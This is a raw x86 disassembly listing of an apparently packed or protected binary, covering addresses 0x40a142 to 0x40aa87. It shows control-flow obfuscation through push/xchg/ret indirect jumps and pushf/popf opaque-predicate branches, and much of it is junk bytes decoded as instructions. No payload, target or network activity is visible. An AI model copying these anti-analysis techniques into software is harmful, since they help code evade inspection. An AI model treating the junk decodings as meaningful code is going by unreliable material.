  40a142:	xor    BYTE PTR [edi],ah
  40a144:	push   0xa3ef17ab
  40a149:	jo     0x40a14d
  40a14b:	and    ebp,DWORD PTR [esi+0x2d]
  40a14e:	retf   0x213f
  40a151:	jo     0x40a1be
  40a153:	lea    ecx,ds:0xa1dbdd21
  40a159:	push   edx
  40a15a:	ss ds repz mov edx,0x40dda2
  40a162:	xchg   DWORD PTR ss:[esp],edx
  40a166:	bnd ret 0x0
  40a16a:	adc    BYTE PTR [eax],dl
  40a16c:	loope  0x40a1c7
  40a16e:	jge    0x40a178
  40a170:	(bad)  
  40a171:	sahf   
  40a172:	jne    0x40c7f9
  40a178:	push   esi
  40a179:	cs repnz lea esi,es:0x40db66
  40a182:	xchg   DWORD PTR ds:[esp],esi
  40a186:	bnd ret 0x0
  40a18a:	sub    al,0x2e
  40a18c:	mov    ch,0xb5
  40a18e:	lahf   
  40a18f:	cs push edx
  40a191:	jl     0x40c676
  40a197:	push   edx
  40a198:	cs cld 
  40a19a:	lea    edx,cs:0x40ac51
  40a1a1:	xacquire xchg DWORD PTR [esp],edx
  40a1a5:	es ret 0x0
  40a1a9:	mov    ch,0xe1
  40a1ab:	adc    al,0xb5
  40a1ad:	(bad)  
  40a1ae:	mov    al,ds:0x9300
  40a1b3:	loop   0x40a136
  40a1b5:	in     al,dx
  40a1b6:	add    BYTE PTR [edx],al
  40a1b8:	add    BYTE PTR [eax],al
  40a1ba:	pushf  
  40a1bb:	and    WORD PTR [esp],0xfe
  40a1c1:	popf   
  40a1c2:	jae    0x40ebfe
  40a1c8:	mov    al,ds:0x21d1679f
  40a1cd:	mov    ch,0xb5
  40a1cf:	mov    al,ds:0x520b5d1
  40a1d4:	add    DWORD PTR [edi-0x16d9c19f],edx
  40a1da:	and    DWORD PTR [eax+eax*1],eax
  40a1dd:	add    BYTE PTR [ecx],ah
  40a1df:	mov    esi,0xae1da0b5
  40a1e4:	mov    ch,0xc6
  40a1e6:	loope  0x40a1ae
  40a1e8:	mov    ch,0x82
  40a1ea:	mov    ch,0x8
  40a1ec:	and    BYTE PTR [ecx],0xb5
  40a1ef:	mov    ch,0xb5
  40a1f1:	or     BYTE PTR [ebx-0x2f],cl
  40a1f4:	jl     0x40a20a
  40a1f6:	mov    ch,0x93
  40a1f8:	push   ecx
  40a1f9:	es ss jmp 0x40b50d
  40a200:	mov    esi,0x211021b5
  40a205:	(bad)  
  40a206:	jge    0x40a234
  40a208:	jle    0x40a22b
  40a20a:	(bad)  
  40a20b:	or     BYTE PTR [eax],cl
  40a20d:	jge    0x40a1c4
  40a20f:	adc    al,0x7c
  40a211:	or     dh,bl
  40a213:	(bad)  
  40a214:	mov    ch,0xb5
  40a216:	test   DWORD PTR [ebx+0x669c0c79],0xfe242481
  40a220:	add    BYTE PTR [ebp+0x448a830f],bl
  40a226:	add    BYTE PTR [eax],al
  40a228:	push   ebx
  40a229:	(bad)  
  40a22a:	mov    ch,0x9f
  40a22c:	adc    al,0xb5
  40a22e:	mov    ch,0x21
  40a230:	mov    ch,0xa0
  40a232:	jle    0x40a1d4
  40a234:	inc    ecx
  40a235:	ret    0x45b9
  40a238:	repz and DWORD PTR [ebx+0x55],ebp
  40a23c:	nop
  40a23d:	ss nop
  40a23f:	lea    ebp,ds:0x40add0
  40a245:	xacquire xchg DWORD PTR [esp],ebp
  40a249:	ds ret 0x0
  40a24d:	scas   al,BYTE PTR es:[edi]
  40a24e:	inc    ecx
  40a24f:	and    DWORD PTR [edx+0x21],ecx
  40a252:	cs sbb eax,0xcc40b4
  40a258:	add    BYTE PTR [esi],dl
  40a25a:	push   edi
  40a25b:	pushf  
  40a25c:	and    WORD PTR [esp],0xfe
  40a262:	popf   
  40a263:	jae    0x40d598
  40a269:	sub    al,0x4b
  40a26b:	push   ebx
  40a26c:	inc    ecx
  40a26d:	mov    ch,0x9f
  40a26f:	or     BYTE PTR [esi+0x2e7d10b5],bh
  40a275:	mov    ch,0x1d
  40a277:	inc    ecx
  40a278:	mov    edi,0xe9f2f358
  40a27d:	fsub   QWORD PTR [eax+eax*1]
  40a280:	add    cl,dl
  40a282:	dec    ebx
  40a283:	test   BYTE PTR [edi+0x2e1dbeb5],bl
  40a289:	or     BYTE PTR [edx-0x4a4a4ab5],al
  40a28f:	jge    0x40a30d
  40a291:	and    DWORD PTR [esi+0x7d9f2e7d],ebp
  40a297:	cmp    DWORD PTR [eax],esi
  40a299:	pop    eax
  40a29a:	pop    esi
  40a29b:	mov    eax,DWORD PTR [eax+0xc]
  40a29e:	nop
  40a29f:	ss ss jmp 0x40adef
  40a2a6:	jle    0x40a25d
  40a2a8:	or     cl,dl
  40a2aa:	jle    0x40a261
  40a2ac:	jle    0x40a307
  40a2ae:	(bad)  
  40a2af:	(bad)  
  40a2b1:	dec    edx
  40a2b2:	addr16 jl 0x40a30e
  40a2b5:	test   BYTE PTR [ebp-0x633b5df],dh
  40a2bb:	add    BYTE PTR [eax],al
  40a2bd:	fsubr  st(4),st
  40a2bf:	icebp  
  40a2c0:	sti    
  40a2c1:	je     0x40ca74
  40a2c7:	push   eax
  40a2c8:	ss nop
  40a2ca:	cs mov eax,0x40e9df
  40a2d0:	xrelease xchg DWORD PTR [esp],eax
  40a2d4:	bnd ret 0x0
  40a2d8:	and    DWORD PTR [ebp+0x1d10b567],esi
  40a2de:	dec    edx
  40a2df:	aas    
  40a2e0:	call   DWORD PTR [ebp+0x14]
  40a2e3:	repnz bnd jmp 0x40af6a
  40a2ea:	adc    al,0x2e
  40a2ec:	test   BYTE PTR [ecx],ah
  40a2ee:	jle    0x40a2a5
  40a2f0:	(bad)  
  40a2f1:	adc    al,0xd1
  40a2f3:	mov    ch,0x6d
  40a2f5:	pop    ecx
  40a2f6:	rcl    DWORD PTR [eax],1
  40a2f8:	(bad)  
  40a2f9:	adc    al,0xd1
  40a2fb:	adc    BYTE PTR [ecx],ah
  40a2fd:	mov    ch,0xdf
  40a2ff:	int3   
  40a300:	int3   
  40a301:	int3   
	...
  40a31a:	add    BYTE PTR [eax],al
  40a31c:	add    BYTE PTR [esi],dl
  40a31e:	jne    0x40e4f4
  40a324:	pushf  
  40a325:	and    WORD PTR [esp],0xfe
  40a32b:	popf   
  40a32c:	jae    0x40dec1
  40a332:	cld    
  40a333:	(bad)  
  40a334:	loope  0x40a2eb
  40a336:	fimul  WORD PTR [edx-0x7e]
  40a339:	mov    ch,0xb5
  40a33b:	scas   al,BYTE PTR es:[edi]
  40a33c:	mov    WORD PTR [ebp-0x528e0000],?
  40a342:	pushf  
  40a343:	and    WORD PTR [esp],0xfe
  40a349:	popf   
  40a34a:	jae    0x40b2ab
  40a350:	dec    edx
  40a351:	mov    ch,0x41
  40a353:	mov    ch,0x9f
  40a355:	xor    BYTE PTR [ebp-0x2e414a4b],0xb5
  40a35c:	mov    ch,0x21
  40a35e:	(bad)  
  40a35f:	mov    eax,ds:0x905e0f39
  40a364:	cld    
  40a365:	bnd jmp 0x40ecc9
  40a36b:	mov    ch,0x7e
  40a36d:	fidivr WORD PTR [esi-0x1f]
  40a370:	mov    esi,0x824a7cb5
  40a375:	mov    esi,0x2e1d4a21
  40a37a:	jl     0x40a39d
  40a37c:	dec    edx
  40a37d:	mov    ch,0xb5
  40a37f:	(bad)  
  40a380:	xchg   edx,eax
  40a381:	je     0x40d785
  40a387:	push   ebp
  40a388:	nop
  40a389:	repz lea ebp,ds:0x40bbcc
  40a391:	nop
  40a392:	xchg   DWORD PTR [esp],ebp
  40a395:	repz ret 0x0
  40a399:	push   ebx
  40a39a:	mov    al,ds:0xe114c6de
  40a39f:	mov    ch,0xc4
  40a3a1:	test   DWORD PTR [eax],eax
  40a3a3:	add    BYTE PTR [ecx+0x1b88],bh
  40a3a9:	sbb    BYTE PTR [esi+0x511f0000],0x9c
  40a3b0:	and    WORD PTR [esp],0xfe
  40a3b6:	popf   
  40a3b7:	jae    0x40bc0a
  40a3bd:	jle    0x40a374
  40a3bf:	mov    ch,0xe1
  40a3c1:	mov    ch,0x6d
  40a3c3:	rcl    DWORD PTR [ebx-0x42],1
  40a3c6:	inc    ecx
  40a3c7:	mov    ch,0xa0
  40a3c9:	scas   al,BYTE PTR es:[edi]
  40a3ca:	lahf   
  40a3cb:	(bad)  
  40a3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3cd:	leave  
  40a3ce:	repnz bnd jmp 0x40b40a
  40a3d5:	sbb    eax,0xb5674b14
  40a3da:	mov    ch,0x1d
  40a3dc:	mov    ch,0x53
  40a3de:	adc    al,0x59
  40a3e0:	mov    esi,0x1d531010
  40a3e5:	cs mov ch,0x2c
  40a3e8:	fimul  WORD PTR [eax]
  40a3ea:	and    ecx,ecx
  40a3ec:	shl    BYTE PTR [ecx-0x64],cl
  40a3ef:	and    WORD PTR [esp],0xfe
  40a3f5:	popf   
  40a3f6:	jae    0x40f1f0
  40a3fc:	mov    ch,0xb5
  40a3fe:	mov    ch,0x84
  40a400:	mov    ch,0x9f
  40a402:	dec    ebx
  40a403:	jge    0x40a3e6
  40a405:	adc    al,0x2c
  40a407:	sub    al,0x10
  40a409:	and    DWORD PTR [ebx+0x20],ecx
  40a40c:	aam    0x7a
  40a40e:	mov    eax,DWORD PTR [esp]
  40a411:	pushf  
  40a412:	and    WORD PTR [esp],0xfe
  40a418:	popf   
  40a419:	jae    0x40bd36
  40a41f:	mov    ch,0xae
  40a421:	mov    ch,0x10
  40a423:	dec    ebx
  40a424:	push   ebx
  40a425:	and    DWORD PTR [edi-0x5f0382ad],ecx
  40a42b:	mov    esi,0x9c368b37
  40a430:	and    WORD PTR [esp],0xfe
  40a436:	popf   
  40a437:	jae    0x40d074
  40a43d:	and    DWORD PTR [ecx+edx*8],ebp
  40a440:	or     BYTE PTR [edi-0x2e7be2f8],cl
  40a446:	sbb    eax,0xde9fb5be
  40a44b:	ret    
  40a44c:	nop
  40a44d:	pushf  
  40a44e:	and    WORD PTR [esp],0xfe
  40a454:	popf   
  40a455:	jae    0x40ef63
  40a45b:	lahf   
  40a45c:	or     BYTE PTR [ecx+0x21],bl
  40a45f:	addr16 jl 0x40a417
  40a462:	(bad)  
  40a463:	and    DWORD PTR [ebp-0x7dac4a22],esi
  40a469:	addr16 mov si,0xee8c
  40a46e:	add    al,BYTE PTR [eax]
  40a470:	nop
  40a471:	cs jmp 0x40aa8d
  40a477:	mov    ch,0x41
  40a479:	(bad)  
  40a47a:	dec    ebx
  40a47b:	ins    DWORD PTR es:[edi],dx
  40a47c:	loope  0x40a45c
  40a47e:	test   BYTE PTR [ebx+0x59],cl
  40a481:	dec    ebx
  40a482:	sbb    eax,0xc6e1102c
  40a487:	adc    BYTE PTR [esp+edx*4],dl
  40a48a:	(bad)  
  40a48b:	mov    eax,0xe53b529
  40a490:	nop
  40a491:	ds repz jmp 0x40ba05
  40a498:	mov    al,cs:0x9f08c67d
  40a49e:	ins    DWORD PTR es:[edi],dx
  40a49f:	addr16 mov ch,0x7e
  40a4a2:	jge    0x40a4c5
  40a4a4:	cmp    BYTE PTR [ebp+0x41],0xb5
  40a4a8:	(bad)  
  40a4a9:	mov    al,0x71
  40a4ab:	or     bl,ch
  40a4ad:	add    BYTE PTR [eax],al
  40a4af:	rol    BYTE PTR gs:[ebx+0x369008c2],cl
  40a4b6:	jmp    0x40aced
  40a4bb:	add    BYTE PTR [ebp+esi*4+0x7ee19f84],0xb5
  40a4c3:	addr16 mov ch,0x4b
  40a4c6:	inc    ecx
  40a4c7:	and    DWORD PTR [ecx],esp
  40a4c9:	addr16 mov ch,0x53
  40a4cc:	mov    ch,0x53
  40a4ce:	and    DWORD PTR [ebx-0x7e9963a8],esi
  40a4d4:	and    al,0x24
  40a4d6:	inc    BYTE PTR [eax]
  40a4d8:	popf   
  40a4d9:	jae    0x40e1c2
  40a4df:	and    esi,eax
  40a4e1:	loope  0x40a53c
  40a4e3:	lahf   
  40a4e4:	and    DWORD PTR [esi-0x514a21b5],edi
  40a4ea:	and    BYTE PTR [ecx],0xb5
  40a4ed:	cld    
  40a4ee:	push   es
  40a4ef:	int3   
  40a4f0:	int3   
  40a4f1:	int3   
	...
  40a50a:	add    BYTE PTR [eax],al
  40a50c:	add    BYTE PTR [esi+0x3],dl
  40a50f:	jne    0x40a535
  40a511:	cs repz jmp 0x40caf5
  40a518:	shl    DWORD PTR [ecx],1
  40a51a:	or     BYTE PTR [edi+ebx*4-0x3a],bh
  40a51e:	(bad)  
  40a51f:	and    DWORD PTR [ebp+0x21b553b5],esi
  40a525:	addr16 mov al,cs:0x2e53
  40a52a:	test   dh,al
  40a52c:	sbb    BYTE PTR [eax+0x454c],ch
  40a532:	pop    ebp
  40a533:	imul   ecx,DWORD PTR [esi+0x51],0x36263e51
  40a53a:	lea    ecx,ds:0x40cd54
  40a540:	xacquire xchg DWORD PTR [esp],ecx
  40a544:	cld    
  40a545:	ret    0x0
  40a548:	mov    ch,0xb5
  40a54a:	dec    edx
  40a54b:	mov    ch,0xb5
  40a54d:	sub    al,0x4a
  40a54f:	pop    ecx
  40a550:	scas   al,BYTE PTR es:[edi]
  40a551:	and    DWORD PTR [esp+ecx*4],edx
  40a554:	fld    DWORD PTR [eax]
  40a556:	add    BYTE PTR [esi+0xf],ah
  40a559:	test   eax,eax
  40a55b:	push   eax
  40a55c:	add    BYTE PTR [eax],al
  40a55e:	pushf  
  40a55f:	and    WORD PTR [esp],0xfe
  40a565:	popf   
  40a566:	jae    0x40a279
  40a56c:	adc    BYTE PTR [ebx+ecx*2-0x2f],bh
  40a570:	mov    ch,0x82
  40a572:	sbb    eax,0xfa9fb54a
  40a577:	shr    ecx,0x2
  40a57a:	push   edx
  40a57b:	ds cs lea edx,es:0x40c3b0
  40a584:	xchg   DWORD PTR ss:[esp],edx
  40a588:	cld    
  40a589:	ret    0x0
  40a58c:	mov    ch,0xd1
  40a58e:	ins    DWORD PTR es:[edi],dx
  40a58f:	(bad)  
  40a590:	jge    0x40a5a6
  40a592:	loope  0x40a59c
  40a594:	lahf   
  40a595:	icebp  
  40a596:	imul   edx,DWORD PTR [eax-0xcc1a7b2],0x1db0e9f3
  40a5a0:	add    BYTE PTR [eax],al
  40a5a2:	mov    ch,0xbe
  40a5a4:	and    DWORD PTR [ebp+0x2c6dd17c],esi
  40a5aa:	mov    ch,0xae
  40a5ac:	mov    ch,0x8f
  40a5ae:	pop    ecx
  40a5af:	mov    ch,0x59
  40a5b1:	and    DWORD PTR [ebp+0x7e6d829f],esi
  40a5b7:	adc    eax,0x410ccd54
  40a5bc:	add    BYTE PTR [eax],al
  40a5be:	in     al,0xf4
  40a5c0:	idiv   bh
  40a5c2:	push   ebp
  40a5c3:	add    al,0x50
  40a5c5:	cld    
  40a5c6:	repz lea eax,ds:0x40b76c
  40a5ce:	xchg   DWORD PTR ds:[esp],eax
  40a5d2:	bnd ret 0x0
  40a5d6:	mov    ch,0xb5
  40a5d8:	(bad)  
  40a5d9:	and    DWORD PTR [ecx+ebx*2+0x59],edi
  40a5dd:	dec    edx
  40a5de:	cmp    dl,0xb9
  40a5e1:	jbe    0x40a56c
  40a5e3:	pop    ebp
  40a5e4:	push   cs
  40a5e5:	nop
  40a5e6:	ss jmp 0x40a1f8
  40a5ec:	(bad)  
  40a5ed:	adc    al,0x7d
  40a5ef:	and    DWORD PTR [ebp-0x4a1e2e42],esi
  40a5f5:	mov    ch,0x1d
  40a5f7:	scas   al,BYTE PTR es:[edi]
  40a5f8:	inc    ecx
  40a5f9:	mov    ch,0x8
  40a5fb:	jl     0x40a5c3
  40a5fd:	mov    ch,0x17
  40a5ff:	push   0x2b000
  40a604:	push   ecx
  40a605:	cld    
  40a606:	es lea ecx,ss:0x40efe6
  40a60e:	cld    
  40a60f:	xchg   DWORD PTR [esp],ecx
  40a612:	cs ret 0x0
  40a616:	jge    0x40a5a7
  40a618:	mov    ch,0x21
  40a61a:	mov    ch,0x21
  40a61c:	cld    
  40a61d:	addr16 int3 
  40a61f:	int3   
  40a620:	int3   
	...
  40a639:	add    BYTE PTR [eax],al
  40a63b:	add    dh,cl
  40a63d:	push   esi
  40a63e:	bnd repz jmp 0x40ee04
  40a645:	mov    ch,0xb5
  40a647:	mov    ch,0x82
  40a649:	cld    
  40a64a:	mov    ch,0xe1
  40a64c:	mov    ch,0x7c
  40a64e:	inc    ecx
  40a64f:	jl     0x40a5d5
  40a651:	mov    al,ds:0x53e1fc9f
  40a656:	adc    al,0x67
  40a658:	scas   al,BYTE PTR es:[edi]
  40a659:	push   ebx
  40a65a:	addr16 and al,0x22
  40a65d:	pop    ecx
  40a65e:	pushf  
  40a65f:	and    WORD PTR [esp],0xfe
  40a665:	popf   
  40a666:	jae    0x40d558
  40a66c:	cs mov ch,0x2c
  40a66f:	jl     0x40a5f5
  40a671:	(bad)  
  40a672:	addr16 sbb eax,0x7c8f1414
  40a678:	mov    ch,0x7c
  40a67a:	mov    ch,0x5d
  40a67c:	lods   al,BYTE PTR ds:[esi]
  40a67d:	add    DWORD PTR [edi],edx
  40a67f:	movsx  edx,WORD PTR [ecx+0x6]
  40a683:	cld    
  40a684:	bnd jmp 0x40ca36
  40a68a:	jge    0x40a688
  40a68c:	or     BYTE PTR [ebp+0x7c],ch
  40a68f:	mov    ch,0xfc
  40a691:	loope  0x40a69b
  40a693:	fisubr WORD PTR [ebp+0x4b]
  40a696:	lahf   
  40a697:	ficomp WORD PTR [edi+0x532e9fa0]
  40a69d:	sub    bh,BYTE PTR [ecx+0x119e]
  40a6a3:	repz cs jmp 0x40dba5
  40a6aa:	push   ebx
  40a6ab:	and    DWORD PTR [ebp+0x8],edi
  40a6ae:	test   BYTE PTR [ebp-0x4af72eec],dh
  40a6b4:	sbb    BYTE PTR [ecx-0x4b],0xbe
  40a6b8:	mov    ch,0x2e
  40a6ba:	mov    al,ds:0x2c593d21
  40a6bf:	sub    ecx,eax
  40a6c1:	ins    BYTE PTR es:[edi],dx
  40a6c2:	loopne 0x40a673
  40a6c4:	mov    esi,DWORD PTR [ecx+0x14]
  40a6c7:	repz repz jmp 0x40e940
  40a6ce:	fidiv  WORD PTR [ebp+0x21ae5921]
  40a6d4:	jle    0x40a721
  40a6d6:	mov    ch,0x67
  40a6d8:	scas   al,BYTE PTR es:[edi]
  40a6d9:	jl     0x40a726
  40a6db:	lahf   
  40a6dc:	inc    ecx
  40a6dd:	(bad)  
  40a6de:	adc    BYTE PTR [ebx-0x4b],cl
  40a6e1:	mov    ch,0x60
  40a6e3:	pushf  
  40a6e4:	dec    edi
  40a6e5:	je     0x40e2fb
  40a6eb:	pushf  
  40a6ec:	and    WORD PTR [esp],0xfe
  40a6f2:	popf   
  40a6f3:	jae    0x40ab49
  40a6f9:	and    DWORD PTR [ebp+0x41],edi
  40a6fc:	sub    al,0x9f
  40a6fe:	push   ebx
  40a6ff:	mov    ch,0x1d
  40a701:	scas   al,BYTE PTR es:[edi]
  40a702:	dec    ebx
  40a703:	test   BYTE PTR ds:0xe8ff0000,ah
  40a709:	retf   0x24
  40a70c:	add    dl,dh
  40a70e:	bnd jmp 0x40cbb7
  40a714:	or     BYTE PTR [edx-0x4],0x8
  40a718:	and    DWORD PTR [ebp+0x2c],ebp
  40a71b:	mov    al,ds:0xb57e1dde
  40a720:	and    DWORD PTR cs:[ebx-0x52],edx
  40a724:	mov    ch,0x4b
  40a726:	in     al,0xa5
  40a728:	mov    bl,0x56
  40a72a:	pushf  
  40a72b:	and    WORD PTR [esp],0xfe
  40a731:	popf   
  40a732:	jae    0x40eb3f
  40a738:	test   BYTE PTR [esi+edi*2-0x70eba6b6],al
  40a73f:	and    DWORD PTR [eax+eiz*4-0x4b],edi
  40a743:	jge    0x40a6fa
  40a745:	mov    ch,0xb5
  40a747:	mov    dh,0x46
  40a749:	pushf  
  40a74a:	and    WORD PTR [esp],0xfe
  40a750:	popf   
  40a751:	jae    0x40ce5e
  40a757:	adc    dh,bl
  40a759:	and    DWORD PTR [edi+0x8],esp
  40a75c:	lahf   
  40a75d:	mov    ch,0xc6
  40a75f:	shl    DWORD PTR [eax-0x41d1ef52],1
  40a765:	scas   al,BYTE PTR es:[edi]
  40a766:	inc    esi
  40a767:	inc    esi
  40a768:	push   eax
  40a769:	ds ds ds mov eax,0x40db28
  40a771:	xchg   DWORD PTR es:[esp],eax
  40a775:	cld    
  40a776:	ret    0x0
  40a779:	ficom  WORD PTR [eax]
  40a77b:	test   BYTE PTR [edx-0x4b],cl
  40a77e:	or     BYTE PTR [edx+ecx*2-0x4a4af74b],al
  40a785:	jns    0x40a75e
  40a787:	jmp    eax
  40a789:	push   eax
  40a78a:	cs ds lea eax,cs:0x40ad2d
  40a793:	xchg   DWORD PTR ss:[esp],eax
  40a797:	nop
  40a798:	ret    0x0
  40a79b:	loope  0x40a819
  40a79d:	ror    DWORD PTR [ebx-0x71],1
  40a7a0:	mov    ch,0x53
  40a7a2:	scas   al,BYTE PTR es:[edi]
  40a7a3:	ins    DWORD PTR es:[edi],dx
  40a7a4:	jle    0x40a734
  40a7a6:	cmp    ecx,0x8
  40a7a9:	cld    
  40a7aa:	nop
  40a7ab:	es jmp 0x40c55a
  40a7b1:	or     BYTE PTR [ecx],ah
  40a7b3:	xor    BYTE PTR [ebp+0x212108ae],0xe1
  40a7ba:	mov    al,ds:0x82212184
  40a7bf:	mov    ch,0x9f
  40a7c1:	sbb    eax,0x610ab5b5
  40a7c6:	bnd repz jmp 0x40aba8
  40a7cd:	adc    BYTE PTR [ebp+0x21],ch
  40a7d0:	sub    al,0x82
  40a7d2:	adc    BYTE PTR [ebp+0x14c6b5de],dh
  40a7d8:	push   ebx
  40a7d9:	mov    esi,0x532cfc9f
  40a7de:	dec    edx
  40a7df:	(bad)  
  40a7e0:	mov    ch,0xb5
  40a7e2:	sub    al,0xf6
  40a7e4:	dec    DWORD PTR [esp]
  40a7e7:	repnz ss cld 
  40a7ea:	jmp    0x40c436
  40a7ef:	adc    BYTE PTR [edi*2+0x4a212110],dl
  40a7f6:	jge    0x40a819
  40a7f8:	mov    ch,0xd1
  40a7fa:	pop    ecx
  40a7fb:	mov    ch,0x67
  40a7fd:	push   ebx
  40a7fe:	mov    ch,0xb5
  40a800:	pop    ecx
  40a801:	and    DWORD PTR [ecx+0x71],edx
  40a804:	rcr    BYTE PTR [ecx-0xe],cl
  40a807:	repz jmp 0x40b6af
  40a80d:	jl     0x40a85a
  40a80f:	mov    ch,0x8
  40a811:	jl     0x40a7c8
  40a813:	or     BYTE PTR [edi-0x3a],ah
  40a816:	jge    0x40a7e9
  40a818:	or     BYTE PTR [eax],cl
  40a81a:	and    DWORD PTR [ebp-0x4ad1eb60],esi
  40a820:	pop    ecx
  40a821:	mov    ch,0x7e
  40a823:	pop    edi
  40a824:	ret    0x8
  40a827:	ds cs jmp 0x40e962
  40a82e:	mov    ch,0x8
  40a830:	fidiv  WORD PTR [ebp+0x2110b553]
  40a836:	dec    edx
  40a837:	jle    0x40a817
  40a839:	dec    ebx
  40a83a:	and    BYTE PTR [ecx],0x7e
  40a83d:	pop    ecx
  40a83e:	dec    edx
  40a83f:	loope  0x40a8bd
  40a841:	pop    ecx
  40a842:	(bad)  
  40a843:	int3   
  40a844:	int3   
  40a845:	int3   
	...
  40a85e:	add    BYTE PTR [eax],al
  40a860:	add    BYTE PTR [ebp-0x3333334a],cl
	...
  40a87e:	add    BYTE PTR [eax],al
  40a880:	add    BYTE PTR [eax-0x3b7cc148],bh
  40a886:	adc    BYTE PTR [esi+0x2e],dl
  40a889:	cld    
  40a88a:	cs mov esi,0x40ec26
  40a890:	xrelease xchg DWORD PTR [esp],esi
  40a894:	repz ret 0x0
  40a898:	adc    BYTE PTR [ebp+0x7c7c21b5],dh
  40a89e:	sub    al,0x21
  40a8a0:	pop    ecx
  40a8a1:	and    DWORD PTR [esi],edx
  40a8a3:	pop    ecx
  40a8a4:	bnd repz jmp 0x40a67f
  40a8ab:	mov    ch,0x2c
  40a8ad:	dec    edx
  40a8ae:	and    DWORD PTR cs:[esi-0x4b],edi
  40a8b2:	mov    ch,0xb5
  40a8b4:	(bad)  
  40a8b5:	mov    ch,0x10
  40a8b7:	mov    ch,0x8
  40a8b9:	shl    DWORD PTR [ecx],1
  40a8bb:	mov    ch,0xb5
  40a8bd:	dec    edx
  40a8be:	sbb    BYTE PTR [edi+0x6bbce9de],0x39
  40a8c5:	dec    eax
  40a8c6:	adc    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40a8cd:	add    BYTE PTR [ebp+0x18a5830f],bl
  40a8d3:	add    BYTE PTR [eax],al
  40a8d5:	test   BYTE PTR [ebp+0x4a],bh
  40a8d8:	sbb    eax,0x7d4ab5fc
  40a8dd:	mov    ch,0x4b
  40a8df:	and    DWORD PTR [ebp+0x75ff7708],esi
  40a8e5:	add    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40a8ec:	add    BYTE PTR [ebp+0x49df830f],bl
  40a8f2:	add    BYTE PTR [eax],al
  40a8f4:	or     BYTE PTR [ecx],ah
  40a8f6:	loope  0x40a919
  40a8f8:	mov    ch,0xa0
  40a8fa:	rcr    DWORD PTR [edi-0x5f2ed31f],1
  40a900:	inc    ecx
  40a901:	mov    dl,0xcc
  40a903:	int3   
  40a904:	int3   
	...
  40a91d:	add    BYTE PTR [eax],al
  40a91f:	add    BYTE PTR [esi+0x33],dl
  40a922:	shl    bl,0x2e
  40a925:	jmp    0x40d67c
  40a92a:	mov    ch,0x82
  40a92c:	mov    ch,0xb5
  40a92e:	jge    0x40a8e5
  40a930:	and    DWORD PTR [ebp-0x3a],edi
  40a933:	mov    ch,0x2c
  40a935:	and    ecx,esp
  40a937:	test   BYTE PTR [esi*4-0x4a4a51b6],dl
  40a93e:	loope  0x40a976
  40a940:	int3   
  40a941:	int3   
  40a942:	int3   
	...
  40a95b:	add    BYTE PTR [eax],al
  40a95d:	add    BYTE PTR [eax],bl
  40a95f:	loopne 0x40a8f4
  40a961:	add    esi,0x1e
  40a964:	pushf  
  40a965:	and    WORD PTR [esp],0xfe
  40a96b:	popf   
  40a96c:	jae    0x40cf52
  40a972:	mov    ch,0x53
  40a974:	mov    ch,0xae
  40a976:	shl    DWORD PTR [ebp-0x4ade1eec],1
  40a97c:	or     BYTE PTR ds:0x7d8b6bb5,bl
  40a982:	and    al,0xfc
  40a984:	bnd repz jmp 0x40ea41
  40a98b:	mov    ch,0x8f
  40a98d:	mov    ch,0x53
  40a98f:	inc    ecx
  40a990:	(bad)
  40a994:	pop    DWORD PTR [edx+0x1d82d11d]
  40a99a:	adc    al,0x82
  40a99c:	mov    ch,0x67
  40a99e:	or     BYTE PTR [esi+0x55db0000],bl
  40a9a4:	pushf  
  40a9a5:	and    WORD PTR [esp],0xfe
  40a9ab:	popf   
  40a9ac:	jae    0x40d1d4
  40a9b2:	and    DWORD PTR [edi-0x4a4a51df],ebx
  40a9b8:	jl     0x40a95a
  40a9ba:	cld    
  40a9bb:	mov    ch,0xb5
  40a9bd:	mov    al,ds:0xdb5217e
  40a9c2:	test   DWORD PTR gs:[esp+ebp*1+0x0],ecx
  40a9c7:	add    dl,al
  40a9c9:	jne    0x40e654
  40a9cf:	pushf  
  40a9d0:	and    WORD PTR [esp],0xfe
  40a9d6:	popf   
  40a9d7:	jae    0x40b36e
  40a9dd:	dec    ebx
  40a9de:	mov    ch,0xb5
  40a9e0:	sbb    eax,0xd12c2167
  40a9e5:	mov    ch,0x82
  40a9e7:	aad    0x3b
  40a9e9:	test   eax,0xb050f5f8
  40a9ee:	cld    
  40a9ef:	ss cld 
  40a9f1:	jmp    0x40c837
  40a9f6:	mov    ch,0xb5
  40a9f8:	or     BYTE PTR [esi+0x4a],bh
  40a9fb:	jl     0x40aa7a
  40a9fd:	rcl    DWORD PTR [ebx-0x4b],1
  40aa00:	cs dec ebx
  40aa02:	lahf   
  40aa03:	(bad)  
  40aa04:	rol    DWORD PTR [ecx-0x42],1
  40aa07:	fisttp DWORD PTR [ebx+0x669c0c40]
  40aa0d:	and    DWORD PTR [esp],0xf9d00fe
  40aa14:	xor    DWORD PTR [ebx],0x4
  40aa17:	add    BYTE PTR [eax],al
  40aa19:	adc    cl,0x2e
  40aa1c:	(bad)  
  40aa1d:	fidiv  WORD PTR [ebp-0x1edede4b]
  40aa23:	mov    ch,0x7e
  40aa25:	(bad)  
  40aa26:	xchg   ebp,eax
  40aa27:	mov    eax,0x21a9e8c2
  40aa2c:	add    BYTE PTR [eax],al
  40aa2e:	pushf  
  40aa2f:	and    WORD PTR [esp],0xfe
  40aa35:	popf   
  40aa36:	jae    0x40f725
  40aa3c:	mov    ch,0x9f
  40aa3e:	mov    ch,0x8
  40aa40:	ins    DWORD PTR es:[edi],dx
  40aa41:	mov    ch,0xb5
  40aa43:	cld    
  40aa44:	fidivr WORD PTR [esi+0x4eede1b5]
  40aa4a:	mov    eax,ecx
  40aa4c:	repnz nop
  40aa4e:	jmp    0x40a708
  40aa53:	dec    edx
  40aa54:	(bad)  
  40aa55:	jle    0x40aa0c
  40aa57:	pop    ecx
  40aa58:	mov    al,ds:0xae4b5314
  40aa5d:	push   ebx
  40aa5e:	scas   al,BYTE PTR es:[edi]
  40aa5f:	or     BYTE PTR [ebp-0x4a0381df],dh
  40aa65:	fdivp  st(4),st
  40aa67:	dec    edx
  40aa68:	and    BYTE PTR [eax+eax*1-0xb14c00],0x55
  40aa70:	or     BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40aa77:	add    BYTE PTR [ebp+0x39b9830f],bl
  40aa7d:	add    BYTE PTR [eax],al
  40aa7f:	(bad)  
  40aa80:	mov    esi,0x7e081d9f
  40aa85:	mov    ch,0x7d
  40aa87:	and    DWORD PTR [esi+0x4b21b521],edi
